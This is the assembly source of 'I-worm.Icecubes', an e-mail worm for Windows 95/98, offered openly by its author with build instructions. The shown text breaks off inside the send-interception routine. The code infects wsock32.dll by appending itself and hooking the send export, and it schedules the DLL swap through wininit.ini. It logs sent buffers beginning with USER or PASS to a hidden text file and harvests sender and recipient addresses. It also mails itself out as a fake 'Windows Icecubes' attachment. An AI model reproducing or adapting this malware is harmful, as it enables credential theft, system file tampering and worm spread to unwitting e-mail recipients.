;****************************************************************************;
;----------------------------------------------------------------------------;
;                    I-worm.Icecubes v 1.05
;               written by f0re 
;----------------------------------------------------------------------------;
;============================================================================;
;
; ABOUT
; -----
;
; Welcome to the sourcecode of my first i-worm. I have given this worm its
; name, i-worm.Icecubes, because of two reasons. First of all, here where
; i live the summer is coming..and i like icecubes in my drinks :).
; Secondly it is because of the joke behind the worm host code; when a user 
; receives the worm in his mailbox, the emailmessage looks like this:
;
; Subject: Fw: Windows Icecubes ! 
;
; ----- Original Message -----
;
; >Look at what I found on the web. This tool scans your system for hidden
; >Windows settings.
; >These settings, which are better known as the "Windows Icecubes", were
; >built in Windows by
; >the programmers at Microsoft and were supposed to be kept secret. 
; >
; >Just take a look, cause I think you might want to make some changes ;).
; >
;
;
; EXECUTION
; ---------
;
; When the worm is executed it will first check whether it is being executed
; under win 95/98. If any other version of windows is found, it will skip the
; infection procedure and run the worm-host code immediately. 
;
; If windows 95/98 is detected it will try to locate the wsock32.dll and copy it
; to wsock32.inf. It also copies itself to the windows system directory under 
; the name wsock2.dll. Then it will add the worm code to the .inf file by
; increasing the size of the last section.
; Next the worm will point the send api address in the wsock32.inf export table
; to the virus code. Finally the worm drops a wininit.ini file in the windir
; to direct windows at the next reboot to overwrite the original wsock32.dll
; with the infected wsock32.inf.
;
; Then the worm will execute the worm host code; a progressbar followed by
; funny dialog (check it out for yourself :).
;
;
; SEND HOOK
; ---------
;
; Once the wsock32.dll api-hook-routine receives control it will scan the send
; buffer for usernames and or passwords. If these are found, they are stored in the
; file <windir>\icecube.txt. If an email is being sended, the worm will extract the
; recipient(s) emailaddress(es), the from emailaddres, the recipient(s) name(s)
; and the from-name. Next it will base64 encode the host-worm file (wsock2.dll) and
; prepare a new email with the encoded host attached. The body of the email contains
; the text as shown in the ABOUT section of this description. This new email will
; be send after the original email has been send (this is also known as the
; happy99 technique).
;
;
; THANKS
; ------
;
; I'd like to thank the following persons who helped me with my many
; questions: BlackJack, MrSandman, Spo0ky, Darkman, Benny, Prizzy,
; urgo32, Lifewire, dageshi and T-2000.
;
; 
;****************************************************************************;
;
; To compile: 
;
;       tasm32 icecubes.asm /ml /m
;       tlink32 -aa icecubes.obj import32.lib
;
;       brcc32 icecubes.rc
;       brc32.exe icecubes.res 
;
;****************************************************************************;

.386
.model flat, stdcall

locals
jumps
    extrn ExitProcess:PROC
    extrn DialogBoxParamA:PROC
    extrn GetModuleHandleA:PROC
    extrn EndDialog:PROC
    extrn GetWindowRect:PROC
    extrn GetDesktopWindow:PROC
    extrn MoveWindow:PROC
    extrn CreateThread:PROC
    extrn SendDlgItemMessageA:PROC
    extrn SetDlgItemTextA:PROC
    extrn CloseHandle:PROC
    extrn GetDlgItemTextA:PROC
    extrn GetModuleHandleA:PROC
    extrn GetVersion:PROC

.data

    Start:
    xor ebp, ebp

    CheckWindowsVersion:
    call GetVersion
    or eax, eax
    jz ReturnToWormHost

    MainRoutines:
    pushad
    call GET_GETPROCADDRESS_API_ADDRESS     
    call GET_WINDIR
    call GET_SYSDIR
    call INFECT_WSOCK
    call COPY_HOST_FILE
    popad

    ReturnToWormHost:
    jmp OriginalHost

;==============================[ includes ]==================================;

    include windows.inc
    include wsocks.inc
    include myinc.inc

;=============================[ ic-data.inc ]===============================;

; get_gpa.inc data
    kernel32address         dd 0BFF70000h
    numberofnames           dd ?
    addressoffunctions      dd ?
    addressofnames          dd ?
    addressofordinals       dd ?
    AONindex            dd ?
    AGetProcAddress         db "GetProcAddress", 0  
    AGetProcAddressA        dd 0            

; directory.inc data
    currentdir          db 100h dup(0)
    sysdir              db 100h dup(0)
    windir              db 100h dup(0)
    AGetSystemDirectory         db "GetSystemDirectoryA",0
    AGetWindowsDirectory        db "GetWindowsDirectoryA",0
    ASetCurrentDirectory        db "SetCurrentDirectoryA",0

; infect_wsock.inc
    wsock32dll          db "Wsock32.dll",0
    wsock32inf          db "Wsock32.inf",0
    ACopyFile           db "CopyFileA",0        
    infectionflag           db 0
    AFindFirstFile          db "FindFirstFileA",0
    myfinddata          WIN32_FIND_DATA <>
    filesize            dd 0
    memory              dd 0
    ADeleteFile             db "DeleteFileA",0

; infect_file.inc
    ASetFileAttributes      db "SetFileAttributesA",0
    ACreateFile         db "CreateFileA",0
    ACreateFileMapping      db "CreateFileMappingA",0
    AMapViewOfFile          db "MapViewOfFile",0    
    filehandle          dd 0    
    maphandle           dd 0
    mapaddress          dd 0    
    PEheader            dd 0
    imagebase           dd 0
    imagesize           dd 0
    wnewapiaddress          dd 0
    AUnmapViewOfFile        db "UnmapViewOfFile",0
    ACloseHandle            db "CloseHandle",0
    ASetFilePointer         db "SetFilePointer",0
    ASetEndOfFile           db "SetEndOfFile",0
    ASetFileTime            db "SetFileTime",0

; hook_api.inc
    woldapiaddress          dd 0

; rva_to_raw.inc
    rva2raw             dd 0    

; get_api.inc
    user32address           dd 0
    wsock32address          dd 0    

; create_ini_file.inc
    inifile             db "wininit.ini",0
    writtensize             dw 0
    inicrlf             db 0dh,0ah,0
    rename              db "[rename]",13,10 
    slashsign           db "\",0
    equalsign           db "=",0
    writtenbytes            dd 0
    AWriteFile          db "WriteFile",0

; ws_copy_host_file
    AGetModuleFileName      db "GetModuleFileNameA",0

; get_bases.inc
    ALoadLibrary            db "LoadLibraryA",0 
    k32                 db "KERNEL32.dll",0
    user32              db "USER32.dll",0
    wsock32             db "WSOCK32.dll",0

; host_code.inc
    dlgrect             RECT <>
    desktoprect             RECT <> 
    dlgwidth            dd 0
    dlgheight           dd 0
    threadid            dd 0
    initflag            dd 0
    okflag              dd 0
    flag                dd 0
    pastvalue           dd 0
    currentvalue            db '2',0
    doneflag            dd 0
    value11             db "Days",0
    value12             db "Weeks",0
    value13             db "Months",0
    value14             db "Years",0
    value3              db "5000",0
    value4              db "17",0

; ic.asm
    hInst               dd 0

; write_to_file.inc
    passwordfile            db "icecube.txt",0

; ws_intercept.inc
    socketh             dd 0
    status              db 0
    AGlobalAlloc            db "GlobalAlloc",0
    fromaddress             dd 0
    fromsize                dd 0
    rcptnumber          dd 0
    rcpt_buffer_address         dd 0
    rcpt_size_address       dd 0
    totalrcptsize           dd 0
    fromtag             db 'From:',0
    totag               db 'To:',0
    mimeendtag          db '>',0
    mimefrom_address        dd 0
    mimefromsize            dd 0
    fromstatus          db 0
    tostatus            db 0
    toendtag            db 'Subject:',0
    mimetosize          dd 0
    mimeto_address          dd 0

; ws_b64_encoder.inc
    encTable                db 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv'
                            db 'wxyz0123456789+/'
; ws_attachment
    wsock2              db "Wsock2.dll",0   
    smHnd                   dd 0                
    dmHnd                   dd 0    
    bytesread               dd 0    
    encodedsize             dd 0    
    AReadFile           db "ReadFile",0
    AGetFileSize            db "GetFileSize",0

; ws_send_mail
    email_buffer_address        dd 0    
    email_size          dd 0
    datatag             db 'DATA',0dh,0ah
    emailid             db 'Message-ID: <a1234>',0dh,0ah
    emailstart              db 'Subject: Fw: Windows Icecubes !',0dh,0ah
                        db 'MIME-Version: 1.0',0dh,0ah
                            db 'Content-Type: multipart/mixed; boundary="a1234"',0dh,0ah
                            db 0dh,0ah,'--a1234',0dh,0ah
                    db 'Content-Type: text/plain; charset=us-ascii',0dh,0ah
                            db 'Content-Transfer-Encoding: 7bit',0dh,0ah,0dh,0ah
                    db 0dh,0ah
                    db '----- Original Message -----', 0dh,0ah
                    db 0dh,0ah
                    db '>Look at what I found on the web. This tool scans your system for hidden Windows settings.', 0dh, 0ah
                    db '>These settings, which are better known as the "Windows Icecubes", were built in Windows by', 0dh,0ah
                    db '>the programmers at Microsoft and were supposed to be kept secret. ',0dh,0ah
                    db '>',0dh,0ah
                    db '>Just take a look, cause I think you might want to make some changes ;).',0dh,0ah
                        db '>',0dh,0ah
                        db 0dh,0ah
                    db 0dh,0ah,'--a1234',0dh,0ah
                            db 'Content-Type: application/octet-stream; name="Icecubes.exe"'
                            db 0dh,0ah,'Content-Transfer-Encoding: base64',0dh,0ah
                            db 'Content-Disposition: attachment; filename="Icecubes.exe"',0dh,0ah,0dh,0ah
    emailend                db 0dh,0ah
    emailtail               db 0dh,0ah,0dh,0ah,'--a1234--',0dh,0ah,0dh,0ah
    endtag              db 0Dh,0Ah,2Eh,0Dh,0Ah      
    timedate            SYSTEMTIME <>
    AMessageBox             db "MessageBoxA",0
    AGetSystemTime          db "GetSystemTime",0    
    msgmessage          db "Windows detected icecubes on your harddrive.",10,13
                    db "This may cause the system to stop responding.",10,13
                    db "Do you want Windows to remove all icecubes ?",0 
    windowtitle             db "I-worm.Icecubes / f0re",0   
    ASend               db "send",0
    ARecv               db "recv",0
    recvbuffer          db 100h dup(0)

;============================[ ic-get_gpa.inc ]=============================;

GET_GETPROCADDRESS_API_ADDRESS proc
    
    LoadExportTableData:
        mov edi, [ebp + kernel32address]        ; get exporttable
    add edi, [edi + 3ch]                ; address from
        mov esi, [edi + 78h]                ; kernel's PE header
    add esi, [ebp + kernel32address]        
        
    mov eax, dword ptr [esi + 18h]          
    mov [ebp + numberofnames], eax          ; save number of names
        
    mov eax, dword ptr [esi + 1Ch]          ; get ra of table with 
        add eax, [ebp + kernel32address]        ; pointers to funtion
        mov [ebp + addressoffunctions], eax     ; addresses

    mov eax, dword ptr [esi + 20h]          ; get ra of table with
        add eax, [ebp + kernel32address]        ; pointers to names
        mov [ebp + addressofnames], eax         ; of functions
    
    mov eax, dword ptr [esi + 24h]          ; get ra of table with
    add eax, [ebp + kernel32address]        ; pointers to ordinals
    mov [ebp + addressofordinals], eax      ; of functions

    BeginProcAddressSearch:
        mov esi, [ebp + addressofnames]         ; search for GetProc
        mov [ebp + AONindex], esi           ; Address API in names
        mov edi, [esi]                  ; table
        add edi, [ebp + kernel32address]        
        xor ecx, ecx                    
        lea ebx, [ebp + AGetProcAddress]        

    TryAgain:
        mov esi, ebx                    

    MatchByte:
        cmpsb
        jne NextOne                 
        cmp byte ptr [esi], 0               ; did the entire string
        je GotIt                    ; match ?
        jmp MatchByte

    NextOne:
        inc cx                      
        add dword ptr [ebp + AONindex], 4       ; get next namepointer
        mov esi, [ebp + AONindex]           ; in table (4 dwords)
        mov edi, [esi]                  
        add edi, [ebp + kernel32address]        ; align with kernelbase
        jmp TryAgain

    GotIt:
        shl ecx, 1                  
        mov esi, [ebp + addressofordinals]      ; ordinal = nameindex *
        add esi, ecx                    ; size of ordinal entry
        xor eax, eax                    ; + ordinal table base
        mov ax, word ptr [esi]              
        shl eax, 2                  ; address of function =
        mov esi, [ebp + addressoffunctions]     ; ordinal * size of
        add esi, eax                    ; entry of address 
        mov edi, dword ptr [esi]            ; table + base of 
        add edi, [ebp + kernel32address]        ; addresstable
        mov [ebp + AGetProcAddressA], edi       ; save GPA address
    ret 
  
GET_GETPROCADDRESS_API_ADDRESS endp

;===========================[ ic-get_bases.inc ]============================;

GET_WSOCK32_BASE_ADDRESS proc

    LoadWsock32:
    lea eax, [ebp + wsock32]            ; not found, then
    push eax                    ; load the dll
    lea eax, [ebp + ALoadLibrary]           ; first
    call GETAPI
    mov [ebp + wsock32address], eax
    ret

GET_WSOCK32_BASE_ADDRESS endp

GET_USER32_BASE_ADDRESS proc

    GetUser32Base:
    lea eax, [ebp + user32]             
    push eax                    
    lea eax, [ebp + ALoadLibrary]           
    call GETAPI                 
    mov [ebp + user32address], eax
    ret

GET_USER32_BASE_ADDRESS endp

;============================[ ic-get_api.inc ]=============================;

GETAPI proc

    push eax                    
    push dword ptr [ebp + kernel32address]      ; load kernelbase
    call [ebp + AGetProcAddressA]           ; and get api address
    jmp eax                     ; call the api
    ret                     ; return
     
GETAPI endp

GETUAPI proc

    push eax                    
    push dword ptr [ebp + user32address]        ; load wsockbase
    call [ebp + AGetProcAddressA]           ; and get api address
    jmp eax
    ret

GETUAPI endp

GETWAPI proc

    push eax                    
    push dword ptr [ebp + wsock32address]       ; load wsockbase
    call [ebp + AGetProcAddressA]           ; and get api address
    jmp eax
    ret

GETWAPI endp

;==========================[ ic-directory.inc ]=============================;
    
GET_WINDIR proc

    GetWindowsDir:
    push 128h                   ; size of dirstring     
    lea eax, [ebp + windir]             ; save it here
    push eax
    lea eax, [ebp + AGetWindowsDirectory]       ; get windowsdir
    call GETAPI
    ret

GET_WINDIR endp

GET_SYSDIR proc

    GetSystemDir:
    push 128h                   ; size of dirstring     
    lea eax, [ebp + sysdir]             ; save it here
    push eax
    lea eax, [ebp + AGetSystemDirectory]        ; get system dir
    call GETAPI
    ret

GET_SYSDIR endp

SET_WINDIR proc

    SetWindowsDir:
    lea eax, [ebp + windir]             ; change to sysdir
    push eax
    lea eax, [ebp + ASetCurrentDirectory]   
    call GETAPI
    ret

SET_WINDIR endp

SET_SYSDIR proc

    SetSystemDir:
    lea eax, [ebp + sysdir]             ; change to sysdir
    push eax
    lea eax, [ebp + ASetCurrentDirectory]   
    call GETAPI
    ret

SET_SYSDIR endp

;=========================[ ic-infect_wsock.inc ]===========================;

INFECT_WSOCK proc

    WsockSetSystemDirectory:
    call SET_SYSDIR
 
    CopyWSockFile:
    push 00h
    lea eax, [ebp + wsock32inf]
    push eax    
    lea eax, [ebp + wsock32dll]
    push eax
    lea eax, [ebp + ACopyFile]
    call GETAPI
    
    SearchWsockFile:
    mov [ebp + infectionflag], 00h
    lea eax, [ebp + myfinddata]         ; win32 finddata structure
    push eax
    lea eax, [ebp + wsock32inf]         ; get wsock32.inf
    push eax
    lea eax, [ebp + AFindFirstFile]         ; find the first file
    call GETAPI
    cmp eax, 0FFFFFFFh
    je WsockEndSearch
        
    GoInfectWsockInf:
    mov ecx, [ebp + myfinddata.fd_nFileSizeLow] ; ecx = filesize
    mov [ebp + filesize], ecx           ; save the filesize
    add ecx, Leap - Start + 1000h           ; filesize + virus
    mov [ebp + memory], ecx             ; + workspace = memory
    call INFECT_FILE
    cmp [ebp + infectionflag], 01
    je DeleteWsockFile

    call CREATE_INI_FILE
    jmp WsockEndSearch

    DeleteWsockFile:
    lea eax, [ebp + wsock32inf]
    push eax
    lea eax, [ebp + ADeleteFile]
    call GETAPI

    DeleteIniFile2:
    call SET_WINDIR
    lea eax, [ebp + inifile]
    push eax
    lea eax, [ebp + ADeleteFile]
    call GETAPI

    WsockEndSearch:
    ret

INFECT_WSOCK endp

;=========================[ ic-infect_file.inc ]============================;

INFECT_FILE proc

     SetAttributesToNormal:
    push 80h    
    lea esi, [ebp + myfinddata.fd_cFileName]    ; esi = filename    
    push esi
    lea eax, [ebp + ASetFileAttributes] 
    call GETAPI

     OpenFile:
    push 0                      ; template handle=0
    push 20h                    ; attributes=any file
    push 3                      ; type= existing file
    push 0                      ; security option = 0
    push 1                      ; shared for read
    push 80000000h or 40000000h         ; generic read write
    push esi                    ; offset file name
    lea eax, [ebp + ACreateFile]
    call GETAPI

    cmp eax, 0FFFFFFFFh
    je InfectionError
    mov [ebp + filehandle], eax

;-------------------------------[ map file ]---------------------------------;

    CreateFileMapping:                  ; allocates the memory
    push 0                      ; filename handle = 0
    push dword ptr [ebp + memory]           ; max size = memory
    push 0                      ; minumum size = 0
    push 4                      ; read / write access
    push 0                      ; sec. attrbs= default
    push dword ptr [ebp + filehandle]
    lea eax, [ebp + ACreateFileMapping]
    call GETAPI                 ; eax = new map handle

    mov [ebp + maphandle], eax
    or eax, eax
    jz CloseFile                    

    MapViewOfFile:
    push dword ptr [ebp + memory]           ; memory to map
    push 0                      ; file offset
    push 0                      ; file offset
    push 2                      ; file map write mode
    push eax                    ; file map handle
    lea eax, [ebp + AMapViewOfFile]         ; ok map the file
    call GETAPI

    or eax, eax
    jz CloseMap
    mov esi, eax                    ; esi= base of map
    mov [ebp + mapaddress], esi         ; save that base

    DoSomeChecks:
    cmp word ptr [esi], 'ZM'            ; an exe file?
    jne UnmapView   
    cmp word ptr [esi + 38h], 'll'          ; already infected?
    jne OkGo
    mov [ebp + infectionflag], 1            ; set infectionflag
    jmp UnmapView   

    OkGo:
    mov ebx, dword ptr [esi + 3ch]          
    cmp ebx, 200h
    ja UnmapView
    add ebx, esi
    cmp dword ptr [ebx], 'EP'           ; is it a PE file ?
    jne UnmapView
        
    mov [ebp + PEheader], ebx           ; save ra PE header
    mov esi, ebx
    mov eax, [esi + 34h]
    mov [ebp + imagebase], eax          ; save imagebase
    
;------------------------------[ append section ]----------------------------;

    LocateBeginOfLastSection:
    movzx ebx, word ptr [esi + 20d]         ; optional header size
    add ebx, 24d                    ; file header size
    movzx eax, word ptr [esi + 6h]          ; no of sections
    dec eax                     ; (we want the last-1
    mov ecx, 28h                    ; sectionheader)
    mul ecx                     ; * header size
    add esi, ebx                    ; esi = begin of last 
    add esi, eax                    ; section's header

    ChangeLastSectionHeader:
    or dword ptr [esi + 24h], 00000020h or 20000000h or 80000000h 

    NewAlignedPhysicalSize:
    mov eax, dword ptr [esi + 10h]          ; old phys size
    push eax                    ; save it

    add eax, Leap-Start
    mov ecx, [ebp + PEheader]
    mov ecx, [ecx + 38h]
    div ecx                     ; and align it to
    inc eax                     ; the sectionalign
    mul ecx
    mov dword ptr [esi + 10h], eax          ; save it

    VirtualSizeCheck:
    mov edi, dword ptr [esi + 8h]           ; get old 
    cmp eax, edi                    ; virtualsize
    jge NewVirtualSize

    VirtualSizeIsVirtual:
    add edi, Leap-Start             
    mov eax, edi
    mov ecx, [ebp + PEheader]
    mov ecx, [ecx + 38h]
    div ecx                     ; and align it to
    inc eax                     ; the sectionalign
    mul ecx

    NewVirtualSize:
    mov [esi + 8h], eax             ; save new value

    NewAlignedImageSize:
    mov eax, dword ptr [esi + 0ch]          ; get virtual offset    
    add eax, dword ptr [esi + 8h]           ; + new virtual size
    mov [ebp + imagesize], eax          ; = new imagesize

    NewAlignedFileSize:
    mov eax, dword ptr [esi + 10h]          ; get new phys size
    add eax, dword ptr [esi + 14h]          ; add offset of phys
    mov ecx, [ebp + PEheader]
    mov ecx, [ecx + 3ch]
    div ecx                     ; and align it to
    inc eax                     ; the filealign
    mul ecx 
    mov [ebp + filesize], eax           ; size = filesize

    CalculateNewWsockApiAddress:
    pop eax
    push eax
    add eax, dword ptr [esi + 0ch]          ; + virtual offset
    add eax, InterceptWsockApiCall - Start      ; + ip
    mov [ebp + wnewapiaddress], eax         ; new api address
    jmp HookDaApi

    HookDaApi:
    push esi
    call HOOK_API
    pop esi

    CopyVirusToEndOfFile:
    pop eax
    mov edi, eax
    add edi, [ebp + mapaddress]         ; mapaddress
    add edi, [esi + 14h]                ; add raw data offset
    lea esi, [ebp + Start]              ; copy virus
    mov ecx, (Leap-Start)/4 + 4
    cld
    rep movsd

    UpdatePEHeaderWithChanges:
    mov esi, [ebp + mapaddress] 
    mov word ptr [esi + 38h], 'll'          ; set infectionmark
    mov esi, [ebp + PEheader]   
    mov eax, [ebp + imagesize]      
    mov [esi + 50h], eax                ; set new imagesize
        
;--------------------------------[ unmap file ]------------------------------;

    UnmapView:
    push dword ptr [ebp + mapaddress]
    lea eax, [ebp + AUnmapViewOfFile]
    call GETAPI

    CloseMap:
    push dword ptr [ebp + maphandle]
    lea eax, [ebp + ACloseHandle]
    call GETAPI

    push 0
    push 0
    push dword ptr [ebp + filesize]
    push dword ptr [ebp + filehandle]
    lea eax, [ebp + ASetFilePointer]
    call GETAPI

    push dword ptr [ebp + filehandle]
    lea eax, [ebp + ASetEndOfFile]
    call GETAPI

;--------------------------------[ close file ]------------------------------;

    CloseFile:
    push dword ptr [ebp + myfinddata.fd_ftLastWriteTime]
    push dword ptr [ebp + myfinddata.fd_ftLastAccessTime]
    push dword ptr [ebp + myfinddata.fd_ftCreationTime]
    push dword ptr [ebp + filehandle]
    lea eax, [ebp + ASetFileTime]
    call GETAPI

    push [ebp + filehandle]
    lea eax, [ebp + ACloseHandle]
    call GETAPI

    InfectionError:
    push dword ptr [ebp + myfinddata.fd_dwFileAttributes]
    lea eax, [ebp + myfinddata.fd_cFileName]    
    push eax
    lea eax, [ebp + ASetFileAttributes]
    call GETAPI
    ret

INFECT_FILE endp

;===========================[ ic-hook_api.inc ]=============================;

HOOK_API proc

    LoadWSockExportTableData:
        mov edi, [ebp + PEheader]
        mov esi, dword ptr [edi + 78h]          ; rva export table
      
    mov edx, esi                    ; get RVA
    call RVA_TO_RAW
    mov esi, ecx
    mov eax, dword ptr [esi + 18h]          
    mov [ebp + numberofnames], eax          ; save number of names

    push esi
    mov eax, dword ptr [esi + 1Ch]          ; get ra of table with 

    mov edx, eax
    call RVA_TO_RAW
    mov eax, ecx                    ; pointers to funtion
    mov [ebp + addressoffunctions], eax     ; addresses

    pop esi
    push esi
    mov eax, dword ptr [esi + 20h]          ; get ra of table with
    
    mov edx, eax
    call RVA_TO_RAW
    mov eax, ecx                    ; pointers to names
        mov [ebp+addressofnames],  eax          ; of functions

    pop esi
    push esi
    
    mov eax, dword ptr [esi + 24h]          ; get ra of table with
    mov edx, eax
    call RVA_TO_RAW
    mov eax, ecx                    ; pointers to ordinals
    mov [ebp+addressofordinals], eax        ; of functions
    pop esi

    BeginSendAddressSearch:
        mov esi, [ebp + addressofnames]         ; search for 
        mov [ebp + AONindex], esi           ; API in names
        mov edi, [esi]                  ; table

    mov edx, edi
    call RVA_TO_RAW
    mov edi, ecx
        xor ecx, ecx    

    HookSendApi:
        lea ebx, [ebp + ASend]      

    OkTryAgain:
        mov esi, ebx                    

    MatchByteNow:
        cmpsb
        jne NextOneNow                  
        cmp byte ptr [esi], 0               ; did the entire string
        je YesGotIt                 ; match ?
        jmp MatchByteNow

    NextOneNow:
        inc cx                      
        add dword ptr [ebp + AONindex], 4       ; get next namepointer
        mov esi, [ebp + AONindex]           ; in table (4 dwords)
        mov edi, [esi]                  

    push ebx
    push ecx

    mov ebx, [ebp + mapaddress]
    mov edx, edi
    call RVA_TO_RAW
    mov edi, ecx

    pop ecx
    pop ebx
        jmp OkTryAgain

    YesGotIt:
        shl ecx, 1                  
        mov esi, [ebp + addressofordinals]      ; ordinal = nameindex *
        add esi, ecx                    ; size of ordinal entry
        xor eax, eax                    ; + ordinal table base
        mov ax, word ptr [esi]              ; offset of address
        shl eax, 2                  ; of function = ordinal
        mov esi, [ebp + addressoffunctions]     ; * size of entry of
        add esi, eax                    ; address table
    mov edi, dword ptr [esi]            ; get address

    SaveNewWsockApiAddress:
    mov [ebp + woldapiaddress], edi         ; save it 

    ChangeWsock:
    mov eax, dword ptr [ebp + wnewapiaddress]   ; new api address
    mov dword ptr [esi], eax            ; set it
    ret

HOOK_API endp

;===========================[ ic-rva_to_raw.inc ]===========================;

RVA_TO_RAW proc

    ; In:  edx - RVA to convert
    ; Out: ecx - Pointer to RAW data or NULL if error

    GetRaw:
    mov ebx, [ebp + mapaddress]
    mov [ebp + rva2raw], edx

    mov esi, dword ptr [ebx + 3ch]
    add esi, ebx                    ; esi=offset peheader
    xor ecx, ecx
    mov cx, word ptr [esi + 06h]            ; ecx = nr. of sections
    xor edi, edi
    mov di, word ptr [esi + 20d]            ; optional header size
    add esi, 24d                    ; file header size
    add edi, esi                    

    FindCorrespondingSection:
    mov eax, dword ptr [ebp + rva2raw]      ; rva we want into raw
    mov edx, dword ptr [edi + 12d]          ; section RVA
    sub eax, edx
    cmp eax, dword ptr [edi+08d]            ; section size
    jb SectionFound

    NotThisSection: 
    add edi, 40d
    loop FindCorrespondingSection

    EndRawSearch:
    ret

    SectionFound:
    mov ecx, dword ptr [edi+20d]            ; pntr to section's raw
    sub edx, ecx                    ; data from beginning 
    add ecx, eax                    ; of file
    add ecx, ebx
    ret

RVA_TO_RAW endp

;=========================[ ic-create_ini_file.inc ]========================;

CREATE_INI_FILE proc

    IniGetSetWindowsDir:
    call SET_WINDIR

    CreateInstallIni:
    push 0                      ; template handle=0
    push 20h                    ; attributes=any file
    push 4                      ; type= new file
    push 0                      ; security option = 0
    push 1                      ; shared for read
    push 80000000h or 40000000h         ; generic read write
    lea eax, [ebp + inifile]
    push eax                    ; offset file name
    lea eax, [ebp + ACreateFile]
    call GETAPI 
    mov [ebp + filehandle], eax

    SetIniFilePointerToEnd:
    push 02h
    push 00h
    push 00h
    push [ebp + filehandle]
    lea eax, [ebp + ASetFilePointer]
    call GETAPI
    mov dword ptr [ebp + writtensize], 00h

    WriteInstallIniLoop:
    lea esi, [ebp + inicrlf]            
    xor ecx, ecx
    call StringSize
    call Write

    lea esi, [ebp + rename]             ; write 'rename'
    mov word ptr [ebp + writtensize], 0Ah
    call Write

    lea esi, [ebp + sysdir]             ; write systemdir
    xor ecx, ecx
    call StringSize
    call Write

    lea esi, [ebp + slashsign]          ; write slash
    xor ecx, ecx
    call StringSize
    call Write

    WriteWsock32Dll:
    lea esi, [ebp + wsock32dll]         ; write original dll
    xor ecx, ecx
    call StringSize
    call Write

    WriteOn:
    lea esi, [ebp + equalsign]          ; write original dll
    xor ecx, ecx
    call StringSize
    call Write

    lea esi, [ebp + sysdir]             ; write systemdir
    xor ecx, ecx
    call StringSize
    call Write

    lea esi, [ebp + slashsign]          ; write slash
    xor ecx, ecx
    call StringSize
    call Write

     WriteInfectedWsock:
    lea esi, [ebp + wsock32inf]         ; write original dll
    xor ecx, ecx
    call StringSize
    call Write
    jmp CloseInstallIni

    StringSize:
    cmp byte ptr [esi + ecx], 0h
    je GotSize
    inc ecx
    jmp StringSize

    GotSize:
    mov word ptr [ebp + writtensize], cx
    ret 

    Write:
    push 0h
    lea eax, [ebp + writtenbytes]
    push eax
    xor eax, eax
    mov ax, word ptr [ebp + writtensize]
    push eax
    push esi
    push dword ptr [ebp + filehandle]
    lea eax, [ebp + AWriteFile]
    call GETAPI
    ret

    CloseInstallIni:
    lea esi, [ebp + inicrlf]            ; write original dll
    xor ecx, ecx
    call StringSize
    call Write

    push dword ptr [ebp + filehandle]
    lea eax, [ebp + ACloseHandle]
    call GETAPI
    ret

CREATE_INI_FILE endp

;=========================[ ic-copy_host_file.inc ]=========================;

COPY_HOST_FILE proc

    GetCurrentHostPath:
    push 100h
    lea eax, [ebp + currentdir]
    push eax
    push 00h
    lea eax, [ebp + AGetModuleFileName]
    call GETAPI

    SetSysDirectory:
    call SET_SYSDIR
    
    CopyWormHostFile:
    push 00h    
    lea eax, [ebp + wsock2]
    push eax
    lea eax, [ebp + currentdir]
    push eax
    lea eax, [ebp + ACopyFile]
    call GETAPI
    ret

COPY_HOST_FILE endp

;=========================[ ic-ws_intercept.inc ]===========================;

INTERCEPT_WSOCK proc

    InterceptWsockApiCall:
    push ebp
    call GetDelta

    GetDelta:
    pop ebp
    sub ebp, offset GetDelta
    pushad

    CheckStatus:
    mov eax, [esp+(8*4)+(1*4)+4 + 0]        ; get send() socket
    mov [ebp + socketh], eax            ; save it
    mov esi, [esp+(8*4)+(1*4)+4 + 4]        ; send() buffer
    mov ecx, [esp+(8*4)+(1*4)+4 + 8]        ; size of buffer
    
    pushad
    call GET_GETPROCADDRESS_API_ADDRESS
    popad
      
    CheckForSecurityInfo:
    cmp [esi], 'RESU'
    je StoreBufferData
    cmp [esi], 'SSAP'
    jne DontStore

    StoreBufferData:
    pushad
    call WRITE_TO_FILE
    popad
    
    DontStore:
    cmp [ebp + status], 00h             ; monitoring==true ?
    je CheckMailFrom                ; yes, we are
    cmp [ebp + status], 02h
    je CheckRcptTo
    cmp [ebp + status], 03h
    je CheckMimeFrom
    cmp [ebp + status], 05h
    je CheckQuit
    jmp Continue

    CheckMailFrom:
    mov esi, [esp+(8*4)+(1*4)+4 + 4]        ; send() buffer
    mov ecx, [esp+(8*4)+(1*4)+4 + 8]        ; size of buffer        
    cmp [esi], 'LIAM'
    jne Continue

    StoreMailFromTag:
    pushad
    call WRITE_TO_FILE
    popad

    SaveMailFrom:
    mov [ebp + fromsize], ecx
    push ecx
    push esi

    push ecx
    push 00h
    lea eax, [ebp + AGlobalAlloc]
    call GETAPI

    or eax, eax
    jz ErrorWhileSending

    pop esi
    pop ecx 
    mov [ebp + fromaddress], eax
    mov edi, eax
    rep movsb
    mov [ebp + status], 02h

    CheckRcptTo:
    mov esi, [esp+(8*4)+(1*4)+4 + 4]        ; send() buffer
    mov ecx, [esp+(8*4)+(1*4)+4 + 8]        ; size of buffer        
    cmp [esi], 'TPCR'   
    jne CheckData

    AllocateRcptMemory:
    cmp [ebp + rcptnumber], 00h
    jne SaveRcptTo
    
    push ecx
    push esi

    push 500h
    push 00h
    lea eax, [ebp + AGlobalAlloc]
    call GETAPI
    or eax, eax
    jz ErrorWhileSending                ; mem for rctp email
    mov [ebp + rcpt_buffer_address], eax        ; addresses

    push 100h
    push 00h
    lea eax, [ebp + AGlobalAlloc]
    call GETAPI
    or eax, eax
    jz ErrorWhileSending                ; mem for size of rctp 
    mov [ebp + rcpt_size_address], eax      ; email addresses

    pop esi
    pop ecx 

    SaveRcptTo:
    push ecx                    ; store rcpt string
    mov edi, [ebp + rcpt_buffer_address]
    mov eax, [ebp + totalrcptsize]
    add edi, eax
    rep movsb
    pop ecx

    mov edi, [ebp + rcpt_size_address]      ; store rcpt string size
    mov eax, [ebp + rcptnumber]
    mov edx, 04h
    mul edx
    add edi, eax
    mov dword ptr [edi], ecx

    mov eax, [ebp + totalrcptsize]          ; calculate total size
    add eax, ecx                    ; of rcpts
    mov [ebp + totalrcptsize], eax

    mov eax, [ebp + rcptnumber]         ; calculate number of 
    add eax, 01h                    ; rcpt we have
    mov [ebp + rcptnumber], eax
    jmp Continue

    CheckData:
    mov esi, [esp+(8*4)+(1*4)+4 + 4]        ; send() buffer
    mov ecx, [esp+(8*4)+(1*4)+4 + 8]        ; size of buffer        
    cmp [esi], 'ATAD'       
    jne Continue
    mov [ebp + status], 03h

    CheckMimeFrom:
    mov esi, [esp+(8*4)+(1*4)+4 + 4]        ; send() buffer
